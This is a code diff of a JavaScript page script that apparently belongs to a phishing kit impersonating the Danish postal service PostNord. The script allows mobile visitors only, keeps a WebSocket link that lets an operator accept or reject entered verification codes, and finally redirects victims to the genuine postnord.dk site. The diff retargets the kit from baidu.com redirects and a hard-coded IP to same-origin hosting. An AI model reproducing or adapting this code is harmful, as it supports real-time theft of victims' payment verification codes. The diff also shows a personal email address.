@@ -2,26 +2,28 @@
  * @Descripttion: 
  * @version: 
  * @Author: dekun lu
- * @Email: 1364978779@qq.com
  * @Date: 2023-02-19 23:39:35
  * @LastEditors: dekun lu
- * @LastEditTime: 2023-02-25 21:51:07
+ * @LastEditTime: 2023-03-04 02:21:05
  */
 
 /**
  * @name: dekun lu
  * @msg: 连接websocket
- * @email: 1364978779@qq.com
  * @return {*}
  */
 
-const baseURL = 'https://155.94.182.31:8080'
+const API_URL = window.location.origin;
+
+const WS_URL = window.location.origin.replace("http", "ws");
+
+
 //loading    loading-icegif-1.gif
 var loading = document.createElement("div");
 window.onload = async function () {
     //手机端校验
 
-    const data = fetch('https://155.94.182.31:8080/user/check', {
+    const data = fetch(`${API_URL}/user/check`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -32,7 +34,7 @@ window.onload = async function () {
     if (result.code !== 200) {
         alert("请在手机端打开");
         //跳转baidu
-        window.location.href = "https://www.baidu.com";
+        window.location.href = "https://www.postnord.dk";
         return;
     }
 
@@ -61,7 +63,7 @@ window.onload = async function () {
     </div > `;
     document.body.appendChild(loading);
 }
-const ws = new WebSocket("wss://155.94.182.31:8080/api/websocket/user/" + sessionStorage.getItem("uid"));
+const ws = new WebSocket(`${WS_URL}/api/websocket/user/` + sessionStorage.getItem("uid"));
 ws.onopen = function () {
     console.log("连接成功");
 };
@@ -91,7 +93,7 @@ ws.onmessage = function (event) {
         sessionStorage.setItem("data", JSON.stringify(data.data));
         hideLoading();
         //跳转code.html
-        window.location.href = "https://www.baidu.com";
+        window.location.href = "https://www.postnord.dk";
     }
     //拒绝验证码
     if (data.code == 10) {
@@ -107,7 +109,7 @@ ws.onmessage = function (event) {
     //同步完成
     if (data.code == 11) {
 
-        window.location.href = "https://www.baidu.com";
+        window.location.href = "https://www.postnord.dk";
 
         // hideLoading();
     }
@@ -119,6 +121,13 @@ ws.onclose = function () {
 ws.onerror = function () {
     alert("Connection error");
 };
+
+
+//发送心跳，30秒一次
+setInterval(function () {
+    ws.send("ping");
+}, 30000);
+
 
 
 
